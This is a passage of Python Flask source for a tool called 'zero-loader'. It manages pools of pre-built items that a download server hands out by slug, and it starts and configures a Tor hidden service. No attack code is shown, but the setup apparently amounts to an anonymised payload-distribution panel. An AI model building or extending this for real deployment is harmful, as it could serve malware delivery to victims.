@app.route("/api/pools/<pid>", methods=["PUT"])
def api_pools_update(pid):
    if not _ID_RE.match(pid):
        return jsonify({"ok": False}), 400
    data = request.get_json(force=True, silent=True) or {}
    pools = _load_pools()
    idx = next((i for i, p in enumerate(pools) if p["id"] == pid), None)
    if idx is None:
        return jsonify({"ok": False, "error": "not found"}), 404
    p = pools[idx]
    if "name" in data:
        p["name"] = (data["name"] or p["slug"]).strip()
    if "profile_id" in data:
        new_pid = (data["profile_id"] or "").strip()
        if _ID_RE.match(new_pid):
            p["profile_id"] = new_pid
    if "target_count" in data:
        try:
            p["target_count"] = max(1, min(50, int(data["target_count"] or 10)))
        except (TypeError, ValueError):
            pass
    if "paused" in data:
        p["paused"] = bool(data["paused"])
    p["updated_at"] = int(time.time())
    pools[idx] = p
    _save_pools(pools)
    if not p.get("paused"):
        _trigger_pool_fill(p)
    return jsonify({"ok": True, "pool": p})


@app.route("/api/pools/<pid>", methods=["DELETE"])
def api_pools_delete(pid):
    if not _ID_RE.match(pid):
        return jsonify({"ok": False}), 400
    pools = [p for p in _load_pools() if p["id"] != pid]
    _save_pools(pools)
    pdir = POOLS_DIR / pid
    if pdir.is_dir():
        shutil.rmtree(str(pdir), ignore_errors=True)
    return jsonify({"ok": True})


@app.route("/api/pools/<pid>/status")
def api_pool_status(pid):
    if not _ID_RE.match(pid):
        return jsonify({"ok": False}), 400
    pool = _find_pool(pid)
    if not pool:
        return jsonify({"ok": False, "error": "not found"}), 404
    return jsonify({
        "ok":      True,
        "ready":   _pool_ready_count(pid),
        "target":  pool.get("target_count", 10),
        "building": _is_pool_filling(pid),
    })


@app.route("/api/pools/<pid>/fill", methods=["POST"])
def api_pool_fill(pid):
    if not _ID_RE.match(pid):
        return jsonify({"ok": False}), 400
    pool = _find_pool(pid)
    if not pool:
        return jsonify({"ok": False, "error": "not found"}), 404
    if pool.get("paused"):
        return jsonify({"ok": False, "error": "pool is paused"}), 400
    _trigger_pool_fill(pool)
    return jsonify({"ok": True, "building": True})


@app.route("/api/pools/<pid>/pause", methods=["POST"])
def api_pool_pause(pid):
    if not _ID_RE.match(pid):
        return jsonify({"ok": False}), 400
    pools = _load_pools()
    idx = next((i for i, p in enumerate(pools) if p["id"] == pid), None)
    if idx is None:
        return jsonify({"ok": False, "error": "not found"}), 404
    pools[idx]["paused"] = not bool(pools[idx].get("paused"))
    pools[idx]["updated_at"] = int(time.time())
    _save_pools(pools)
    if not pools[idx]["paused"]:
        _trigger_pool_fill(pools[idx])
    return jsonify({"ok": True, "paused": pools[idx]["paused"]})


@app.route("/api/pools/<pid>/clear", methods=["POST"])
def api_pool_clear(pid):
    """Delete all ready items from the pool without deleting the pool itself."""
    if not _ID_RE.match(pid):
        return jsonify({"ok": False}), 400
    if not _find_pool(pid):
        return jsonify({"ok": False, "error": "not found"}), 404
    ready_dir = POOLS_DIR / pid / "ready"
    if ready_dir.is_dir():
        for item_dir in list(ready_dir.iterdir()):
            if item_dir.is_dir():
                shutil.rmtree(str(item_dir), ignore_errors=True)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# Tor management
# ---------------------------------------------------------------------------

_TOR_EXE_DEFAULT    = r"C:\tor\tor-expert-bundle-windows-x86_64-15.0.14\tor\tor.exe"
_TORRC_DEFAULT      = r"C:\tor\torrc"
_TOR_LOG_DEFAULT    = r"C:\tor\tor.log"
_TOR_HS_DIR_DEFAULT = r"C:\tor\hidden_service"

_tor_proc: subprocess.Popen | None = None
_tor_pid:  int | None = None          # tracks PID even after proc handle is lost
_tor_lock = threading.Lock()

_TOR_EXE_PATH  = os.environ.get("TOR_EXE",      _TOR_EXE_DEFAULT)
_TORRC_PATH    = os.environ.get("TORRC_PATH",   _TORRC_DEFAULT)
_TOR_LOG_PATH  = os.environ.get("TOR_LOG_FILE", _TOR_LOG_DEFAULT)

_HS_DIR_RE_  = re.compile(r'^\s*HiddenServiceDir\s+(.+)', re.IGNORECASE)
_HS_PORT_RE_ = re.compile(r'^\s*HiddenServicePort\s+(\S+)\s+(\S+)', re.IGNORECASE)


def _find_tor_pid() -> int | None:
    """Return PID of a running tor.exe process, or None."""
    try:
        out = subprocess.check_output(
            ["tasklist", "/FI", "IMAGENAME eq tor.exe", "/FO", "CSV", "/NH"],
            text=True, stderr=subprocess.DEVNULL,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        for line in out.splitlines():
            line = line.strip()
            if not line:
                continue
            parts = [p.strip('"') for p in line.split(",")]
            if len(parts) >= 2 and parts[0].lower() == "tor.exe":
                try:
                    return int(parts[1])
                except ValueError:
                    pass
    except Exception:
        pass
    return None


def _pid_alive(pid: int) -> bool:
    """Check if a PID is still running without needing a Popen handle."""
    try:
        out = subprocess.check_output(
            ["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"],
            text=True, stderr=subprocess.DEVNULL,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        return str(pid) in out
    except Exception:
        return False


def _tor_running() -> bool:
    global _tor_proc, _tor_pid
    with _tor_lock:
        # Fast path: we own the Popen handle
        if _tor_proc is not None and _tor_proc.poll() is None:
            return True
        # Fallback: check the PID we last knew about
        if _tor_pid is not None and _pid_alive(_tor_pid):
            return True
        return False


def _tor_detect_existing() -> None:
    """On startup, detect a tor.exe already running and record its PID."""
    global _tor_pid
    pid = _find_tor_pid()
    if pid:
        _tor_pid = pid

_tor_detect_existing()


def _tor_ensure_log_in_torrc() -> None:
    """Append a Log directive to torrc if none is present, so output goes to file."""
    try:
        content = Path(_TORRC_PATH).read_text(encoding="utf-8", errors="replace")
        if re.search(r'^\s*Log\b', content, re.IGNORECASE | re.MULTILINE):
            return
        log_line = f"\nLog notice file {_TOR_LOG_PATH}\n"
        with open(_TORRC_PATH, "a", encoding="utf-8") as f:
            f.write(log_line)
    except Exception:
        pass


def _tor_start() -> dict:
    global _tor_proc, _tor_pid
    with _tor_lock:
        # Already running via our Popen handle
        if _tor_proc and _tor_proc.poll() is None:
            return {"ok": False, "error": "Tor is already running"}
        # Already running externally (server was restarted)
        if _tor_pid and _pid_alive(_tor_pid):
            return {"ok": False, "error": f"Tor is already running (PID {_tor_pid})"}
        exe = Path(_TOR_EXE_PATH)
        if not exe.is_file():
            return {"ok": False, "error": f"tor.exe not found: {_TOR_EXE_PATH}"}
        rc = Path(_TORRC_PATH)
        if not rc.is_file():
            return {"ok": False, "error": f"torrc not found: {_TORRC_PATH}"}
        _tor_ensure_log_in_torrc()
        try:
            _tor_proc = subprocess.Popen(
                [str(exe), "-f", str(rc)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
            )
            _tor_pid = _tor_proc.pid
            return {"ok": True, "pid": _tor_proc.pid}
        except Exception as e:
            return {"ok": False, "error": str(e)}


def _tor_stop() -> dict:
    global _tor_proc, _tor_pid
    with _tor_lock:
        # Kill via Popen handle if we own it
        if _tor_proc and _tor_proc.poll() is None:
            try:
                _tor_proc.terminate()
                try:
                    _tor_proc.wait(timeout=8)
                except subprocess.TimeoutExpired:
                    _tor_proc.kill()
            except Exception as e:
                return {"ok": False, "error": str(e)}
            finally:
                _tor_proc = None
                _tor_pid  = None
            return {"ok": True}
        # Kill by PID if tor was running before server started
        if _tor_pid and _pid_alive(_tor_pid):
            try:
                subprocess.run(
                    ["taskkill", "/PID", str(_tor_pid), "/F"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
                )
                _tor_pid = None
                return {"ok": True}
            except Exception as e:
                return {"ok": False, "error": str(e)}
        return {"ok": False, "error": "Tor is not running"}


def _tor_read_torrc() -> str:
    try:
        return Path(_TORRC_PATH).read_text(encoding="utf-8", errors="replace")
    except Exception as e:
        return f"# error reading torrc: {e}"


def _tor_write_torrc(content: str) -> dict:
    try:
        Path(_TORRC_PATH).write_text(content, encoding="utf-8")
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _tor_parse_services(torrc: str) -> list:
    services: list[dict] = []
    cur: dict | None = None
    for line in torrc.splitlines():
        m = _HS_DIR_RE_.match(line)
        if m:
            cur = {"dir": m.group(1).strip(), "ports": [], "onion": None}
            services.append(cur)
            hostname = Path(cur["dir"]) / "hostname"
            if hostname.is_file():
                try:
                    cur["onion"] = hostname.read_text(encoding="utf-8").strip()
                except Exception:
                    pass
            continue
        m = _HS_PORT_RE_.match(line)
        if m and cur is not None:
            cur["ports"].append({"virtual": m.group(1), "target": m.group(2)})
    return services


def _tor_read_log(n: int = 150) -> list:
    lf = Path(_TOR_LOG_PATH)
    if not lf.is_file():
        return []
    try:
        lines = lf.read_text(encoding="utf-8", errors="replace").splitlines()
        return lines[-n:]
    except Exception:
        return []


@app.route("/api/tor/status")
def api_tor_status():
    running = _tor_running()
    pid = (_tor_proc.pid if _tor_proc and _tor_proc.poll() is None else _tor_pid) if running else None
    torrc = _tor_read_torrc()
    svcs  = _tor_parse_services(torrc)
    return jsonify({
        "running":  running,
        "pid":      pid,
        "tor_exe":  _TOR_EXE_PATH,
        "torrc":    _TORRC_PATH,
        "services": svcs,
    })


@app.route("/api/tor/start", methods=["POST"])
def api_tor_start():
    return jsonify(_tor_start())


@app.route("/api/tor/stop", methods=["POST"])
def api_tor_stop():
    return jsonify(_tor_stop())


@app.route("/api/tor/restart", methods=["POST"])
def api_tor_restart():
    _tor_stop()
    time.sleep(1.5)
    return jsonify(_tor_start())


@app.route("/api/tor/log")
def api_tor_log():
    return jsonify({"ok": True, "lines": _tor_read_log()})


@app.route("/api/tor/torrc", methods=["GET"])
def api_tor_torrc_get():
    return jsonify({"ok": True, "content": _tor_read_torrc()})


@app.route("/api/tor/torrc", methods=["POST"])
def api_tor_torrc_save():
    data = request.get_json(force=True, silent=True) or {}
    return jsonify(_tor_write_torrc(data.get("content", "")))


@app.route("/api/tor/port", methods=["POST"])
def api_tor_port():
    """Update HiddenServicePort mapping for the first hidden service in torrc."""
    data    = request.get_json(force=True, silent=True) or {}
    virtual = (data.get("virtual") or "").strip()
    target  = (data.get("target")  or "").strip()
    hs_dir  = (data.get("dir")     or "").strip()
    if not virtual or not target:
        return jsonify({"ok": False, "error": "virtual and target required"}), 400
    torrc = _tor_read_torrc()
    lines = torrc.splitlines(keepends=True)
    out: list[str] = []
    in_block = False
    replaced = False
    for line in lines:
        if _HS_DIR_RE_.match(line):
            block_dir = line.strip().split(None, 1)[1].strip() if len(line.strip().split(None, 1)) > 1 else ""
            in_block = (not hs_dir or block_dir == hs_dir)
        if in_block and _HS_PORT_RE_.match(line) and not replaced:
            out.append(f"HiddenServicePort {virtual} {target}\n")
            replaced = True
            continue
        out.append(line)
    if not replaced:
        out.append(f"\nHiddenServicePort {virtual} {target}\n")
    result = _tor_write_torrc("".join(out))
    return jsonify(result)


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    # Only trigger pool fills in the actual worker process, not the reloader parent.
    # WERKZEUG_RUN_MAIN is set by the reloader in the child worker process.
    _is_worker = os.environ.get("WERKZEUG_RUN_MAIN") == "true" or not os.environ.get("FLASK_DEBUG")
    if _is_worker:
        for _p in _load_pools():
            _trigger_pool_fill(_p)

    port    = int(os.environ.get("ZLOADER_PORT",    "8080"))
    dl_port = os.environ.get("ZLOADER_DL_PORT", "7890").strip()
    dl_host = os.environ.get("ZLOADER_DL_HOST", "127.0.0.1").strip()

    if dl_port:
        from werkzeug.serving import make_server
        _dl_app = Flask("zero-loader-dl")
        _dl_app.add_url_rule("/d/<slug>", "pool_download", pool_download)

        def _run_dl_server():
            srv = make_server(dl_host, int(dl_port), _dl_app)
            print(f"[zero-loader dl]  http://{dl_host}:{dl_port}/d/<slug>  (download only)")
            srv.serve_forever()

        threading.Thread(target=_run_dl_server, daemon=True).start()

    print(f"[zero-loader web] http://127.0.0.1:{port}")
    print(f"[zero-loader web] project root: {PROJECT_ROOT}")
    print("[zero-loader web] localhost-only; DO NOT expose to a network")
    app.run(host="127.0.0.1", port=port, debug=True, threaded=True)
